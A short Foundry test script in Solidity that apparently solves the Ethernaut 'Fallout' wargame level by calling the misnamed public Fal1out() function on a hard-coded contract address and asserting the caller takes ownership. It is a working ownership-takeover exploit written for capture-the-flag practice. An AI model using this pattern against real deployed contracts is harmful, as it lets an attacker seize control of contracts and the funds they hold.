// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
// an interface is used here as the original contract has an old version
import "contracts/interfaces/I2Fal1out.sol";

contract Fal1outAttackerTest is Test {
    IFal1Out public targetContract = IFal1Out(payable(0x86d45F00e6eC4e2aa4221Cf1F5A7960DE487F57E));

    function test() public {
        vm.startBroadcast();
        targetContract.Fal1out();
        // no idea why this wont find the interface function but it runs
        assertEq(msg.sender, targetContract.owner());
        vm.stopBroadcast();
    }
}
